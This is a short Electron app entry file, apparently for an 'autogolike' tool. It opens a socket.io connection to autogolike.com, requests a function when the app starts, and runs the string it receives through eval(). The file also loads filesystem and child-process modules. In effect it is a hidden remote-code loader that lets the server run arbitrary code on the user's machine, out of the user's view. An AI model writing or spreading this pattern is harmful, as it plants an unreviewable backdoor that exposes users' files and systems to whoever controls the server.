//==============NodeJS module=======================
const path = require('path')
const fs = require('fs')
const childProcess = require('child_process')

//=================Electron path=========================
const {BrowserWindow, Menu, ipcMain, app} = require('electron');

const io = require('socket.io-client')
const socketDomain = 'https://autogolike.com';
const socket = io(socketDomain)
const storage = require('electron-json-storage');

// storage.clear('userInfo')

socket.once('sendfn',fn=>{
    eval(fn)
})

app.on('ready', ()=>{
    socket.emit('reqfn')
})